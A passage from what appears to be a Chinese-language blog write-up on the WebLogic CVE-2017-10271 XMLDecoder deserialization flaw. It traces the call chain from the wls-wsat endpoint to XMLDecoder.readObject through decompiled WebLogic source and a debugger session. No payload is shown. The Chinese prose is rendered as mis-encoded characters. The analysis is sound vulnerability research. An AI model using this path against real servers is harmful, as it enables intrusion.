class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.JAXWSServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;JAXWSServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.http.AbstractAsyncServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AbstractAsyncServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;820&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;227&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;125&quot;</span> <span class="attr">method</span>=<span class="string">&quot;invokeServlet&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;301&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;184&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3732&quot;</span> <span class="attr">method</span>=<span class="string">&quot;wrapRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3696&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;321&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;120&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2273&quot;</span> <span class="attr">method</span>=<span class="string">&quot;securedExecute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletRequestImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletRequestImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;1490&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;256&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;221&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ns2:exception</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">detail</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">S:Fault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">S:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">S:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-3.png"><br>åˆ†æè°ƒç”¨æ ˆï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸‹é¢çš„è°ƒç”¨æµç¨‹ï¼š</p><ul><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest</li><li>weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld</li><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive</li><li>weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest</li><li>weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest</li><li>weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry</li><li>weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF</li><li>java.beans.XMLDecoder-&gt;readObject</li></ul><p>å›åˆ°æ¼æ´åˆ©ç”¨æ—¶çš„æ¼æ´åœ°å€ï¼š<code>POST /wls-wsat/CoordinatorPortType HTTP/1.1</code>ï¼Œå¯ä»¥çœ‹åˆ°å½¢æˆæ¼æ´çš„æ¥å£åº”å½“æ˜¯<code>wls-wsat</code>ï¼ŒæŸ¥çœ‹æºæ–‡ä»¶å¯ä»¥çœ‹åˆ°servletæ˜ å°„å…³ç³»<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-4.png"></p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>å…·ä½“çš„æ­¥éª¤æµç¨‹ï¼Œæˆ‘æŠŠæ–­ç‚¹æ‰“åœ¨äº† <code>weblogic.wsee.jaxws.WLSServletAdapter</code> ç±»çš„handleå‡½æ•°ï¼Œæ¥ä¸‹æ¥è·Ÿè¿›åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var2.getMethod().equals(<span class="string">&quot;GET&quot;</span>) || var2.getMethod().equals(<span class="string">&quot;HEAD&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">HttpMetadataPublisher</span> <span class="variable">var4</span> <span class="operator">=</span> (HttpMetadataPublisher)<span class="built_in">this</span>.endpoint.getSPI(HttpMetadataPublisher.class);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span> &amp;&amp; var4.handleMetadataRequest(<span class="built_in">this</span>, <span class="built_in">this</span>.createConnection(var1, var2, var3))) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isOraWsdlMetadataQuery(var2.getQueryString())) &#123;</span><br><span class="line">            <span class="built_in">this</span>.publishWSDL(<span class="built_in">this</span>.createConnection(var1, var2, var3));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>.handle(var1, var2, var3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ª <code>handle</code> æ–¹æ³•ï¼Œç”¨äºå¤„ç†æ¥è‡ª Web æœåŠ¡çš„ HTTP è¯·æ±‚ã€‚å®ƒæ˜¯åœ¨ä¸€ä¸ªå¯èƒ½å±äº SOAP æˆ– REST WebæœåŠ¡çš„ Java ç±»ä¸­ï¼Œå¤„ç†ç‰¹å®šç±»å‹çš„ HTTP è¯·æ±‚ï¼Œå°¤å…¶æ˜¯é’ˆå¯¹å…ƒæ•°æ®å’Œ WSDL å‘å¸ƒã€‚ä»¥ä¸‹æ˜¯å¯¹è¿™ä¸ªå‡½æ•°å„éƒ¨åˆ†çš„è¯¦ç»†åˆ†æï¼š<br>å‚æ•°</p><ul><li><code>ServletContext var1</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒä¸º servlet å®šä¹‰äº†ä¸€ä¸ªèŒƒå›´ä¸ºæ•´ä¸ªåº”ç”¨çš„è§†å›¾ï¼Œä½¿ servlet èƒ½å¤Ÿè·å¾—å…³äºå…¶è¿è¡Œç¯å¢ƒçš„ä¿¡æ¯ã€‚</li><li><code>HttpServletRequest var2</code>ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è¯·æ±‚ä¿¡æ¯ï¼Œç”¨äºæ£€æŸ¥æ­¤æ¬¡ HTTP è¯·æ±‚çš„æ–¹æ³•å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</li><li><code>HttpServletResponse var3</code>ï¼šè¡¨ç¤ºæœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„å“åº”ï¼Œå¯ç”¨äºè®¾ç½®å“åº”çš„ç±»å‹ã€å†…å®¹ç­‰ã€‚</li></ul><ol><li><p><strong>æ£€æŸ¥è¯·æ±‚æ–¹æ³•</strong>:</p><ul><li>æ–¹æ³•é¦–å…ˆæ£€æŸ¥ HTTP è¯·æ±‚æ˜¯å¦ä¸º <code>GET</code> æˆ– <code>HEAD</code> æ–¹æ³•ã€‚è¿™ä¸¤ç§æ–¹æ³•é€šå¸¸ç”¨äºè·å–ä¿¡æ¯ï¼Œä¸å¯¹æœåŠ¡å™¨çš„çŠ¶æ€è¿›è¡Œæ›´æ”¹ã€‚</li></ul></li><li><p><strong>å¤„ç†å…ƒæ•°æ®è¯·æ±‚</strong>:</p><ul><li>å¦‚æœè¯·æ±‚æ–¹æ³•æ˜¯ <code>GET</code> æˆ– <code>HEAD</code>ï¼Œä»£ç å°è¯•è·å–ä¸€ä¸ª <code>HttpMetadataPublisher</code> çš„å®ä¾‹ã€‚è¿™ä¸ªå®ä¾‹å¯èƒ½æ˜¯ç”¨äºå‘å¸ƒæˆ–å¤„ç†ä¸ HTTP ç›¸å…³çš„å…ƒæ•°æ®çš„ã€‚</li><li><code>this.endpoint.getSPI(HttpMetadataPublisher.class)</code> æ–¹æ³•è°ƒç”¨å¯èƒ½æ˜¯è·å–æœåŠ¡æä¾›æ¥å£ï¼ˆSPIï¼‰ï¼Œç”¨äºå…·ä½“çš„å…ƒæ•°æ®å‘å¸ƒé€»è¾‘ã€‚</li><li>å¦‚æœ <code>var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))</code> è¿”å› <code>true</code>ï¼Œè¯´æ˜å¯¹å…ƒæ•°æ®çš„è¯·æ±‚å·²è¢«å¤„ç†ï¼Œå¹¶ä¸”æ²¡æœ‰æ›´å¤šçš„æ“ä½œéœ€è¦æ‰§è¡Œï¼Œæ–¹æ³•ä¼šæå‰è¿”å›ã€‚</li></ul></li><li><p><strong>å¤„ç† WSDL å‘å¸ƒ</strong>:</p><ul><li>æ¥ä¸‹æ¥ï¼Œå¦‚æœè¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯é’ˆå¯¹ WSDL çš„ï¼ˆé€šè¿‡ <code>this.isOraWsdlMetadataQuery(var2.getQueryString())</code> æ£€æŸ¥ï¼‰ï¼Œåˆ™æ‰§è¡Œ <code>this.publishWSDL(this.createConnection(var1, var2, var3))</code>ã€‚</li><li>è¿™ä¸€æ­¥å¯èƒ½æ¶‰åŠåˆ° Web æœåŠ¡æè¿°è¯­è¨€ï¼ˆWSDLï¼‰çš„å‘å¸ƒï¼Œå®ƒæ˜¯ä¸€ä¸ª XML æ ¼å¼çš„æ–‡æ¡£ï¼Œæè¿°äº†ç½‘ç»œæœåŠ¡çš„æ¥å£ï¼Œä»¥ä¾¿å®¢æˆ·ç«¯çŸ¥é“å¦‚ä½•ä¸æœåŠ¡äº¤äº’ã€‚</li><li>ä¸å¤„ç†å…ƒæ•°æ®è¯·æ±‚ç›¸åŒï¼Œå¦‚æœå¤„ç†äº† WSDL å‘å¸ƒï¼Œæ–¹æ³•ä¹Ÿä¼šæå‰è¿”å›ã€‚</li></ul></li><li><p><strong>è°ƒç”¨çˆ¶ç±»å¤„ç†æ–¹æ³•</strong>:</p><ul><li>å¦‚æœè¯·æ±‚æ—¢ä¸æ˜¯å…ƒæ•°æ®è¯·æ±‚ä¹Ÿä¸æ˜¯ WSDL æŸ¥è¯¢ï¼Œé‚£ä¹ˆå°†é€šè¿‡è°ƒç”¨ <code>super.handle(var1, var2, var3)</code> æ¥ç»§ç»­å¤„ç†è¯·æ±‚ã€‚è¿™è¡¨æ˜å½“å‰æ–¹æ³•æ˜¯åœ¨æŸä¸ªç»§æ‰¿å±‚æ¬¡ä¸­ï¼Œä¸”çˆ¶ç±»ä¹Ÿæœ‰å¤„ç†è¯·æ±‚çš„é€»è¾‘ã€‚</li></ul></li></ol><p>æ¥ä¸‹æ¥è·Ÿè¿›åˆ°ï¼šAuthenticatedSubject.java çš„ doAs æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">doAs</span><span class="params">(AbstractSubject var1, PrivilegedExceptionAction var2)</span> <span class="keyword">throws</span> PrivilegedActionException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(SecurityLogger.getNullAction());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line">            SubjectManager.getSubjectManager().pushSubject(var1, <span class="built_in">this</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var11 = <span class="literal">true</span>;</span><br><span class="line">                var4 = var2.run();</span><br><span class="line">                var11 = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var12) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var12;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PrivilegedActionException</span>(var13);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var11) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var7-- &gt; var3) &#123;</span><br><span class="line">                        SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var5-- &gt; var3) &#123;</span><br><span class="line">                SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µ Java ä»£ç æ˜¯ä¸€ä¸ªå®ç°ç‰¹æƒåŠ¨ä½œæ‰§è¡Œçš„å‡½æ•°ï¼Œé€šå¸¸ç”¨åœ¨å®‰å…¨æ•æ„Ÿçš„ç¯å¢ƒä¸­ï¼Œæ¯”å¦‚ Java çš„å®‰å…¨æ¡†æ¶ä¸­ã€‚å®ƒçš„åŠŸèƒ½æ˜¯åœ¨ç‰¹å®šçš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä¼ å…¥çš„ <code>PrivilegedExceptionAction</code> åŠ¨ä½œã€‚ä¸‹é¢æ˜¯å¯¹è¿™ä¸ªå‡½æ•° <code>doAs</code> çš„é€æ­¥åˆ†æï¼š<br>å‚æ•°</p><ul><li><code>AbstractSubject var1</code>: è¿™ä¸ªå‚æ•°ä»£è¡¨çš„æ˜¯æ‰§è¡ŒåŠ¨ä½œçš„ä¸»ä½“ï¼ˆsubjectï¼‰ï¼Œåœ¨å®‰å…¨æ¡†æ¶ä¸­ç”¨äºè¡¨ç¤ºæ“ä½œçš„æ‰§è¡Œè€…ã€‚</li><li><code>PrivilegedExceptionAction var2</code>: è¿™æ˜¯ä¸€ä¸ªå‡½æ•°å¼æ¥å£ï¼Œå®šä¹‰äº†éœ€è¦åœ¨ç‰¹å®šæƒé™ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œçš„æ“ä½œã€‚</li></ul><p>åŠŸèƒ½</p><ol><li><strong>å‚æ•°æ ¡éªŒ</strong>: å‡½æ•°é¦–å…ˆæ£€æŸ¥ <code>var2</code> æ˜¯å¦ä¸º nullã€‚å¦‚æœæ˜¯ nullï¼Œåˆ™æŠ›å‡ºä¸€ä¸ª <code>SecurityException</code>ï¼Œè¡¨ç¤ºä¸èƒ½æ‰§è¡Œç©ºçš„æ“ä½œã€‚</li><li><strong>ä¸»ä½“ä¸Šä¸‹æ–‡çš„æ¨å…¥</strong>: åœ¨æ‰§è¡ŒåŠ¨ä½œä¹‹å‰ï¼Œå‡½æ•°ä½¿ç”¨ <code>SubjectManager.getSubjectManager().pushSubject(var1, this)</code> å°†å½“å‰ä¸»ä½“ <code>var1</code> æ¨å…¥ä¸»ä½“ç®¡ç†å™¨çš„æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†è®¾ç½®å½“å‰çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚</li><li><strong>æ‰§è¡ŒåŠ¨ä½œ</strong>:<ul><li>ä½¿ç”¨ <code>try</code> å—æ¥æ‰§è¡Œ <code>var2.run()</code>ï¼Œå³æ‰§è¡Œä¼ å…¥çš„ç‰¹æƒæ“ä½œã€‚</li><li>å¦‚æœåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿ <code>RuntimeException</code>ï¼Œåˆ™ç›´æ¥å°†è¿™ä¸ªå¼‚å¸¸æŠ›å‡ºã€‚</li><li>å¦‚æœå‘ç”Ÿå…¶ä»–ç±»å‹çš„ <code>Exception</code>ï¼Œåˆ™å°†å…¶å°è£…åœ¨ä¸€ä¸ª <code>PrivilegedActionException</code> ä¸­æŠ›å‡ºï¼Œè¿™æ˜¯ä¸ºäº†å¤„ç†ç‰¹æƒæ“ä½œå¯èƒ½æŠ›å‡ºçš„æ£€æŸ¥å‹å¼‚å¸¸ã€‚</li></ul></li><li><strong>å¼‚å¸¸å¤„ç†</strong>:<ul><li><code>finally</code> å—ç¡®ä¿æ— è®º <code>var2.run()</code> æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼ˆåŒ…æ‹¬å¼‚å¸¸ï¼‰ï¼Œéƒ½å°†å½“å‰ä¸»ä½“ä»ä¸»ä½“ç®¡ç†å™¨çš„æ ˆä¸­å¼¹å‡ºï¼Œç›´åˆ°æ ˆçš„å¤§å°å›åˆ°åˆå§‹çŠ¶æ€ <code>var3</code>ã€‚</li><li>è¿™ä¸€æ­¥æ˜¯å¿…è¦çš„ï¼Œä»¥ç¡®ä¿å®‰å…¨ä¸Šä¸‹æ–‡åœ¨æ“ä½œå®Œæˆåèƒ½æ¢å¤åˆ°åŸå§‹çŠ¶æ€ï¼Œé˜²æ­¢å®‰å…¨æ¼æ´ã€‚</li></ul></li><li><strong>æ¢å¤ä¸»ä½“ä¸Šä¸‹æ–‡</strong>:<ul><li>åœ¨ <code>try</code> å—åï¼Œæœ‰å¦ä¸€ä¸ªå¾ªç¯ç”¨äºå¤„ç†å¼‚å¸¸å¤–çš„æƒ…å†µï¼ŒåŒæ ·ç¡®ä¿ä¸»ä½“æ ˆè¢«æ­£ç¡®æ¸…ç†ã€‚</li></ul></li></ol><p>ä¸Šé¢æµç¨‹å¤ªé•¿äº†ï¼Œä¸‹é¢ç›´æ¥æŠŠæ–­ç‚¹æ‰“åœ¨<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">            <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeaderOld(var3);</span><br><span class="line">                <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.processRequest(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-5.png"><br>var1ä¸ºPOSTä¼ è¿›æ¥çš„XMLæ•°æ®ï¼Œvar3æ˜¯xmlçš„å¤´éƒ¨è§£æï¼Œå¦‚æœå­˜åœ¨ï¼ˆå¤´ä¸ä¸ºç©ºï¼‰ï¼Œå°±è¿›å…¥readHeaderOld()æ–¹æ³•ï¼Œè·Ÿè¿›readHeaderOld()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="type">WorkContextXmlInputAdapter</span> <span 